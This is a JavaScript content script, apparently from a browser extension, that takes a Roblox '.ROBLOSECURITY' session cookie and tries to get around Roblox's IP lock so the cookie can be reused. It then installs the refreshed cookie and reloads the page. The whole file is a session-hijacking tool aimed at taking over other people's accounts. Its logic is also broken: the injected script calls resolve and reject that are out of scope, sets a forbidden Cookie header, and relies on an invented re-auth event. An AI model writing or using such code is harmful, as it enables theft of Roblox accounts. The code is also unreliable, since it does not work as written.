chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  if (msg.action === 'bypassIP') {
    console.log('Bypass started with cookie:', msg.cookie);
    bypassIPLock(msg.cookie).then(newCookie => {
      console.log('Bypass success, new cookie:', newCookie);
      document.cookie = `.ROBLOSECURITY=${newCookie}; path=/; domain=.roblox.com; secure; samesite=lax`;
      location.reload();
      sendResponse({action: 'newCookie', cookie: newCookie});
    }).catch(e => {
      console.error('Bypass failed:', e);
      sendResponse({action: 'bypassError', error: e.message || 'Unknown error'});
    });
    return true; // Async response
  }
});

async function bypassIPLock(oldCookie) {
  return new Promise((resolve, reject) => {
    const script = document.createElement('script');
    script.textContent = `
      (function() {
        try {
          // Inject Roblox's login re-auth logic (reverse-engineered 2025 behavior)
          const xhr = new XMLHttpRequest();
          xhr.open('GET', '/login', true); // Load login page context
          xhr.withCredentials = true;
          xhr.setRequestHeader('Cookie', '.ROBLOSECURITY=${oldCookie}');
          xhr.onload = function() {
            if (xhr.status === 200) {
              // Trigger Roblox's internal re-auth (mimics user action)
              const event = new Event('re-auth-trigger');
              window.dispatchEvent(event);
              // Poll for new cookie (5s max)
              let attempts = 0;
              const interval = setInterval(() => {
                const newCookie = document.cookie.match(/\.ROBLOSECURITY=([^;]+)/);
                if (newCookie || attempts > 50) { // 50 * 100ms = 5s
                  clearInterval(interval);
                  if (newCookie) {
                    resolve(newCookie[1]);
                  } else {
                    reject(new Error('No new cookie after re-auth'));
                  }
                }
                attempts++;
              }, 100);
            } else {
              reject(new Error('Login page load failed: ' + xhr.status));
            }
          };
          xhr.onerror = () => reject(new Error('Network error'));
          xhr.send();
        } catch (e) {
          reject(e);
        }
      })();
    `;
    document.head.appendChild(script);
    script.remove(); // Clean up
  }).catch(e => {
    console.error('Bypass promise failed:', e);
    throw e;
  });
}

// Listen for Roblox's re-auth response (if they expose it)
window.addEventListener('re-auth-trigger', () => {
  console.log('Re-auth trigger fired - waiting for Roblox to update cookie');
  // Roblox's JS should handle the rest - we just wait for the cookie change
});